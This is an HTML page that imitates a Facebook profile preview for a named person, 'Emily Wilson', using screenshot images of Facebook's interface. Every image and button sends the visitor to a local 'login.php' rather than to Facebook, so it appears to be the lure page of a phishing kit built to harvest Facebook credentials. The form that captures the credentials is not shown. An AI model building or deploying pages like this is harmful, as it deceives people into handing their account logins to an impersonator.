<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
</head>
<body>

    <img id="menu" class="fullWidthImage" src="images/menu.jpg" onclick="login();">

    <img class="fullWidthImage" src="images/menuFiller.jpg" onclick="login();">

    <div class="login">
        <div class="hline"></div>
        <p class="mainFont">Emily Wilson is on Facebook. To connect with Emily, join Facebook today.</p>
        <img id="join" src="images/join.jpg" onclick="login();">
        <p id="divide" class="mainFont">______________ or ______________</p>
        <img id="login" src="images/login.jpg" onclick="login();">
        <p></p>
        <div class="hline"></div>
    </div>

    <img class="fullWidthImage" src="images/profileimg.jpg" onclick="login();">

    <p class="mainFont" id="fullName">Emily Wilson</p>

    <img class="fullWidthImage" src="images/options.jpg" onclick="login();">

    <img class="fullWidthImage" src="images/photos.jpg" onclick="login();">

    <img class="fullWidthImage" src="images/copyright.jpg" onclick="login();">

    <script>
        function login() {
            window.location.href = "./login.php";
        }
    </script>

    <style>
        body, html
        {
            margin: 0;
            background-color: white;
        }

        #menu
        {
            position: fixed;
            width: 100%;
            background-color: white;
        }

        .login
        {
            background-color: rgb(244,244,244);
            margin-top: 0;
        }

        .mainFont
        {
            font-family: Arial, Helvetica, sans-serif;
            text-align: center;
            font-size: 13pt;
            margin-left: 10%;
            width: 80%;
            color: rgb(25,25,25);
        }

        .fullWidthImage
        {
            width: 100%;
            display: block
        }

        .hline {
            border-top: 1px  solid rgb(160,160,160);
            width: 100%;
            align-self: center;
        }

        #join
        {
            width: 86%;
            margin-left: 7%;
        }

        #divide
        {
            font-size: small;
            margin-top: 0;
            color: rgb(110,110,110);
        }

        #login
        {
            width: 50%;
            margin-left: 25%;
        }

        #fullName
        {
            margin-top: 0;
            font-size: 24pt;
        }
    </style>
    
</body>
</html>